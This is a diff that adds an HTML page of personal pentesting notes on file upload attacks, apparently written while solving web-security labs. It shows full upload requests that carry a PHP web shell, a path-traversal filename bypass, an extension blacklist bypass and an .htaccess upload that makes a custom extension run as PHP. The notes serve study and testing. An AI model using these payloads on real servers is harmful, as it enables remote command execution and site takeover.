@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Mi Blog</title>
+  <link rel="stylesheet" href="file:///Users/b0ydc/Documents/CYBER/SITE/css/styles.css">
+</head>
+<body>
+  <header>
+    <h4 align="right">@b0ydC</h4>
+  </header>
+
+  <main>
+    <article>
+     
+<h2>1. GENERAL INFORMATION</h2> 
+
+<u>QUESTION TO ANSWER</u> Is this happening client or server-side...?  <br><br>
+
+<code>
+
+NOTES:<br><br>
+- if this file type is non-executable, such as an image or a static HTML page, the server may just send the file's contents to the client in the
+HTTP response.<br>
+- if the file type is executable, such as PHP file, and the server is configured to execute files of this type, it will assign variables based on
+the headers and parameters in the HTTP request before running the script. the resulting output may then be sent to the client in an HTTP response. <br>
+- if the file type is executable, but the server is not configured to execute files of this type it will generally respond with an error. however
+in some cases the contents of the file may still be served to the client as plain text. such configurations can occasionally be exploited to leak source
+code and other sensitive information.<br><br>
+  
+<u>TO CHECK:</u> <br><br>
+
+1. It is happening locally or not, open dev tools and check network tab for interactions.<br>
+2. Caido or burp is your best friend here, inspect all requests.<br>
+3. Be aware of file extention > content type > magic bytes<br>
+4. Test all previous options.<br><br>
+
+PHP: .php | .php1 | .php3 | .phtml<br>
+IMG: .img | .png | .jpeg<br>
+PLAINTEXT: .txt<br><br>
+
+<u>TO TRY:</u><br><br>
+
+1. Change filename extention.<br>
+2. Change content type.<br>
+3. Add the webshell to the content, sample, image. [jpg, png, etc]<br><br>
+
+SAMPLE POST REQUEST<br><br>
+
+------WebKitFormBoundaryiL3FsJfTWvA7Aw9B<br>
+Content-Disposition: form-data; name="avatar"; filename="me2.php"<br>
+Content-Type: image/jpeg
+
+</code>
+
+<h2>2. LOCAL FILE INCLUSION</h2> 
+
+....
+
+<h2>3. REMOTE FILE INCLUSION</h2>  
+
+<code>
+
+INFO: Collection of tools/commands to use when testing for remote file inclusion vulnerabilities. RFI</code><br><br>
+
+<u>VIA PATH TRAVERSAL</u><br><br>
+
+<code>
+
+NOTE:<br> <br>
+- Basicaly the techniques used when attempting path traversal can be used. it is chain of vulnerabilities to exploit the function.<br>
+- to accomplish this you already need to have the way to upload .php files and the restriction you are facing is that the folder where is stored 
+the is not allowed to execute php scripts. so, there's one way to bypass the functions and it using the path traversal vulnerability to upload 
+the php file and call from other place to try if the folder is allowing the exection of php files.<br><br>
+
+SAMPLE:<br><br>
+
+REQUEST<br><br>
+  
+POST /my-account/avatar HTTP/1.1<br>  
+Sec-Fetch-User: ?1<br>
+Sec-Fetch-Dest: document<br>
+Referer: https://machetevault.com/my-account?id=test<br>
+Accept-Encoding: gzip, deflate, br, zstd<br>
+Accept-Language: en-US,en;q=0.9<br>
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxx4ZBSf7IF4INbDK<br>
+Cookie: session=aJLEFa1aOrMRT7qfoAmDJrvyjEkoYyLD
+
+------WebKitFormBoundaryxx4ZBSf7IF4INbDK<br>
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"<br>
+Content-Type: text/php<br>
+
+&lt;&quest;php echo system($_GET['command']); ?><br>
+------WebKitFormBoundaryxx4ZBSf7IF4INbDK<br>
+Content-Disposition: form-data; name="user"<br>
+
+wiener<br>
+------WebKitFormBoundaryxx4ZBSf7IF4INbDK<br>
+Content-Disposition: form-data; name="csrf"<br>
+
+QZE9swn3US3RvXoq0zs1pYBE7kuo42gl<br>
+------WebKitFormBoundaryxx4ZBSf7IF4INbDK--<br><br>
+
+NOTE:<br><br>
+- Content-Disposition Encoded >>> Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"<br>
+Sometimes it is needed to encode the values as sometimes the application harden or strip characters.  <br><br>
+  
+once the file is uploaded,<br><br>
+
+RESPONSE<br><br>
+
+HTTP/1.1 200 OK<br>
+Date: Sun, 02 Feb 2025 00:30:25 GMT<br>
+Server: Apache/2.4.41 (Ubuntu)<br>
+Vary: Accept-Encoding<br>
+Keep-Alive: timeout=5, max=100<br>
+Connection: close<br>
+Content-Type: text/html; charset=UTF-8<br>
+X-Frame-Options: SAMEORIGIN<br>
+Content-Length: 135<br>
+
+The file avatars/../exploit.php has been uploaded.<br><br>
+
+<a href="/my-account" title="Return to previous page"><« Back to My Account</a><br><br>
+
+You see the file was successfully uploaded, so, you need to go one folder back to test if the file is there.</code><br><br>
+
+<u>EXTENSION BLACKLIST BYPASS</u><br><br>
+
+<code>
+
+Such blacklists can sometimes be bypassed by using lesser known, alternative file extensions that may still be executable, such as .php5, 
+.shtml, and so on.</code><br><br>
+
+<u>OVERRIDE SERVER CONFIG</u><br><br>
+
+<code>
+
+servers typically won't execute files unless they have been configured to do so. before an Apache server will execute PHP files requested by a client, 
+developers might have to edit /etc/apache2/apache2.conf<br><br>
+
+Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the 
+global settings. Apache servers, for example, will load a directory-specific configuration from a file called .htaccess if one is present. similarly, 
+developers can make directory-specific configuration on IIS servers using a web.config file. <br><br>
+
+So, you may occasionally find servers that fail to stop you from uploading your own malicious configuration file. In this case, even if the file extension 
+you need is blacklisted, you may be able to trick the server into mapping an arbitrary, custom file extension to an executable MIME type.<br><br>
+
+SAMPLE<br><br>
+
+REQUEST: <br><br>
+  
+POST /my-account/avatar HTTP/1.1<br>
+Referer: https://machetevault.com/my-account<br>
+Accept-Encoding: gzip, deflate, br, zstd<br>
+Accept-Language: en-US,en;q=0.9<br>
+Cookie: session=Amvce1GTzrJM44dIQ4z5yBIb0lnqiGS6<br><br>
+
+------WebKitFormBoundaryvzIa21H4a0qAp0T0<br>
+Content-Disposition: form-data; name="avatar"; filename="cumbia.php"<br>
+Content-Type: text/php<br>
+
+&lt;&quest;php echo system($_GET['command']); ?><br>
+------WebKitFormBoundaryvzIa21H4a0qAp0T0<br>
+Content-Disposition: form-data; name="user"<br><br>
+
+RESPONSE:<br><br>
+
+HTTP/1.1 403 Forbidden<br>
+Date: Sun, 02 Feb 2025 01:45:46 GMT<br>
+Server: Apache/2.4.41 (Ubuntu)<br>
+Keep-Alive: timeout=5, max=100<br>
+Connection: close<br>
+Content-Type: text/html; charset=UTF-8<br>
+X-Frame-Options: SAMEORIGIN<br>
+Content-Length: 164<br><br>
+
+Sorry, php files are not allowed.<br><br>
+
+</code>
+
+<u>EXPLOIT</u><br><br>
+
+<code>
+
+the response provide information about the web server you are working on, so you can search for default config files associated to the webserver you
+found. to attempt to force the app to use a different config file, you need to change a couple of parameters on the content disposition of the 
+request.<br><br>
+
+<u>FROM</u><br><br>
+
+------WebKitFormBoundaryvzIa21H4a0qAp0T0<br>
+Content-Disposition: form-data; name="avatar"; filename="cumbia.php"<br>
+Content-Type: text/php<br><br>
+
+<&lt;&quest;php echo system($_GET['command']); &quest;&gt;<br><br>
+
+<u>TO</u><br><br>
+
+------WebKitFormBoundaryvzIa21H4a0qAp0T0<br>
+Content-Disposition: form-data; name="avatar"; filename=".htaccess"<br>
+Content-Type: text/plain<br><br>
+
+AddType application/x-httpd-php .l33t<br><br>
+  
+<u>AND</u><br><br>
+
+So, we modified the payload itself to force the server to use a new extension file as a valid extension to execute php payloads. so, 
+the next step is to upload the exploit with the extension we just allowed. [.l33t]<br><br>
+
+------WebKitFormBoundaryvzIa21H4a0qAp0T0<br>
+Content-Disposition: form-data; name="avatar"; filename="cumbia.l33t"<br>
+Content-Type: text/php<br><br>
+
+&lt;&quest;php echo system($_GET['command']); ?>
+
+</code>
+
+    </article>
+  </main>
+</body>
+</html>
